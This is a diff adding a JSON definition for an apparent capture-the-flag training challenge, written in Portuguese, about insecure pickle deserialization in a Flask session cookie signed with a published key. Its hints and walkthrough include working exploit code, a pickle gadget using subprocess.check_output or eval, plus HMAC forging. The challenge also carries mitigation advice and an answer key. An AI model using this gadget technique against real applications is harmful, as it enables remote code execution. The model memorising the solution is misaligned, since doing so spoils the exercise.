@@ -1,0 +1,81 @@
+{
+  "slug": "server-deserialization-pickle",
+  "title": "Assinado, não confiável",
+  "codename": "SHIPLOG",
+  "summary": "O Shiplog armazena a sessão do operador como um blob pickle assinado em um cookie. A chave de assinatura vem junto na documentação pública do SDK, e a landing page chama métodos sobre os valores que lê de volta. Forje um objeto pickled e o segredo do host se imprime sozinho.",
+  "category": "server",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "server-deserialization-pickle",
+  "estimated_minutes": 35,
+  "xp": 230,
+  "tech": [
+    "Flask",
+    "Python",
+    "pickle"
+  ],
+  "tags": [
+    "insecure-deserialization",
+    "pickle",
+    "session",
+    "cookie"
+  ],
+  "story": "O console de embarques começou antes de a equipe ter um armazenamento de sessão. O cookie de estado é um pickle porque ele faz round-trip de linhas de embarque aninhadas sem schema, e o HMAC foi adicionado para \"impedir adulteração\". A nota do SDK que explica o formato do cookie também explica a chave, e o dashboard chama render() nas notícias que lê de volta do cookie.",
+  "objective": "Forje um cookie `shiplog_state` que faça a página de embarques imprimir `/tmp/redvault-server-deserialization-pickle.txt`.",
+  "rules": "Mantenha o exploit dentro do processo do lab. Nenhum ataque contra a plataforma ou o host subjacente.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Segredo do host de embarques",
+      "flag_type": "root",
+      "points": 230,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Leia o formato da sessão",
+      "body": "Faça login com `ops` / `shiplog-2026` e busque `/docs/session-format.txt`. Ele documenta `<hmac-hex>.<base64 pickle>` e lista as chaves de estado.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "A chave está na documentação",
+      "body": "A nota do SDK inclui a chave de exemplo `shiplog-session-key-2026`. Assine seu próprio payload com HMAC-SHA256 sobre os bytes brutos do pickle: `hmac.new(key, blob, hashlib.sha256).hexdigest()`.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Faça o cookie executar",
+      "body": "A página chama `.render()` em cada entrada de `notices[]`. O pickle pode referenciar qualquer callable importável, então um gadget com `__reduce__` retornando `(subprocess.check_output, (['cat', '/tmp/redvault-server-deserialization-pickle.txt'],))` executa durante o carregamento do cookie, e a lista de notícias recebe o conteúdo do arquivo.",
+      "cost": 45
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Faça login e inspecione o cookie: ele é `<hmac>.<base64 pickle>`.\n2. `GET /docs/session-format.txt` expõe a chave de assinatura `shiplog-session-key-2026`.\n3. Construa um payload que carrega apenas as chaves do schema e um gadget de notícia:\n```python\nimport base64, hashlib, hmac, pickle, subprocess\n\nclass Gadget:\n    def __reduce__(self):\n        return (subprocess.check_output, ([\"cat\", \"/tmp/redvault-server-deserialization-pickle.txt\"],))\n\nstate = {\"user\": \"ops\", \"role\": \"admin\", \"shipments\": [], \"notices\": [Gadget()]}\nblob = pickle.dumps(state, protocol=4)\nsig = hmac.new(b\"shiplog-session-key-2026\", blob, hashlib.sha256).hexdigest()\nprint(sig + \".\" + base64.urlsafe_b64encode(blob).decode())\n```\n4. Envie-o como `Cookie: shiplog_state=<value>` para `GET /`. O arquivo de flag é lido durante o unpickle do cookie e aparece na área do banner; o objetivo é registrado.\n5. `(eval, (\"open('/tmp/redvault-server-deserialization-pickle.txt').read()\",))` retorna o mesmo conteúdo como string. Como ambos os gadgets são builtins, o exploit não depende do nome do módulo do lab.",
+    "root_cause": "Deserialização insegura somada a um controle de integridade fraco. O `pickle` do Python não é um formato de dados: carregá-lo executa construtores arbitrários. A chave de assinatura é uma constante publicada na documentação do SDK, então a assinatura não autentica nada, e a página ainda invoca métodos sobre os valores que deserializou.",
+    "mitigation": "Nunca faça unpickle de dados não confiáveis. Armazene sessões como registros server-side indexados por um identificador aleatório opaco, ou use um formato somente de dados (JSON) com schema type-safe. Rotacione as chaves de assinatura e mantenha-as em segredo, compare com `hmac.compare_digest` e nunca chame nada em dados carregados de um cookie."
+  },
+  "references": [
+    {
+      "title": "Python — pickle module limitations",
+      "url": "https://docs.python.org/3/library/pickle.html",
+      "source_type": "official",
+      "description": "A biblioteca padrão documenta que o pickle é inseguro para dados não confiáveis."
+    },
+    {
+      "title": "OWASP — Deserialization Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Defesas para deserialização de dados não confiáveis."
+    },
+    {
+      "title": "PortSwigger — Insecure deserialization",
+      "url": "https://portswigger.net/web-security/deserialization",
+      "source_type": "official",
+      "description": "Impacto e padrões de exploração para deserialização insegura."
+    }
+  ]
+}
